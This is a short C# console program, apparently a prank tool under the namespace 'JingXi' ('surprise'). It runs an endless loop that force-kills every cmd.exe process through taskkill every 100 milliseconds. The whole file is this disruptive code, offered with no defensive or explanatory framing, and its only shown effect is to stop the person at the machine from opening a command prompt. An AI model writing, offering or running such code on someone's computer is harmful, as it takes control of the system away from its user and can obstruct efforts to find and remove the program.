using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Threading;

namespace JingXi
{
    class Program
    {
        static void Main(string[] args)
        {
            // Console.WriteLine("Hello World!");
            while (true)
            {
                Process.Start("/windows/system32/taskkill.exe", "/f /im cmd.exe");
                Thread.Sleep(100);
            }

            // Console.Read();
            
        }
    }
}
